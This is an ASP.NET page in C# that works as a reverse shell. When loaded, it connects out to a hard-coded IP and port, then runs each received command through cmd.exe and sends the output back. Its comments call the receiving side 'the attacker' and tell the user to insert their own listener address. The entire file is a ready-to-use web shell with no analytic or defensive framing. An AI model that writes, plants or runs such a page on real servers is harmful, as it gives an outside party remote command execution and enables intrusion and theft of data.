<%@ Page Language="C#" %>
<%
    string ip = "10.8.26.138"; // Replace with your Linux machine's IP address
    int port = 1234;           // Replace with your listening port on Linux

    try
    {
        // Create TCP connection to the listener on the Linux server
        System.Net.Sockets.TcpClient tcpClient = new System.Net.Sockets.TcpClient(ip, port);
        System.IO.StreamReader reader = new System.IO.StreamReader(tcpClient.GetStream());
        System.IO.StreamWriter writer = new System.IO.StreamWriter(tcpClient.GetStream());

        writer.WriteLine("Connected to Reverse Shell");
        writer.Flush();

        string command;
        while (true)
        {
            writer.Write("Shell> ");
            writer.Flush();
            command = reader.ReadLine();

            if (command.ToLower() == "exit")
            {
                break;
            }

            if (command.StartsWith("cd "))
            {
                try
                {
                    string newDir = command.Substring(3);
                    System.IO.Directory.SetCurrentDirectory(newDir);
                    writer.WriteLine("Changed directory to: " + System.IO.Directory.GetCurrentDirectory());
                }
                catch
                {
                    writer.WriteLine("Directory not found.");
                }
            }
            else
            {
                try
                {
                    // Execute the command using cmd.exe on Windows
                    System.Diagnostics.ProcessStartInfo processInfo = new System.Diagnostics.ProcessStartInfo();
                    processInfo.FileName = "cmd.exe";
                    processInfo.Arguments = "/C " + command; // /C allows the command to run and return control
                    processInfo.RedirectStandardOutput = true;
                    processInfo.RedirectStandardError = true;
                    processInfo.UseShellExecute = false;
                    processInfo.CreateNoWindow = true;

                    System.Diagnostics.Process process = System.Diagnostics.Process.Start(processInfo);
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();

                    // Send output or error to the attacker
                    writer.WriteLine(output + error);
                }
                catch (Exception ex)
                {
                    writer.WriteLine("Error: " + ex.Message);
                }
            }
        }

        writer.Close();
        reader.Close();
        tcpClient.Close();
    }
    catch (Exception ex)
    {
        Response.Write("Error: " + ex.Message);
    }
%>
